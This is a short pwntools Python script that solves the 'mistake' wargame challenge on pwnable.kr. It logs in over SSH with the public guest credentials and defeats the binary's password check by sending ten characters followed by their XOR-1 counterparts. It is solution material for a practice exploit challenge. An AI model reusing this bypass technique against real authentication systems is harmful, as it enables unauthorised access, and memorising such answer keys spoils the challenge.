from pwn import *


s = ssh(host="pwnable.kr", user="mistake", password="guest", port=2222)
p = s.process("./mistake")

input_pass_char = 'A'
actual_pass_char = chr(ord(input_pass_char) ^ 1)

p.send(actual_pass_char * 10)
p.send(input_pass_char * 10)

p.interactive()
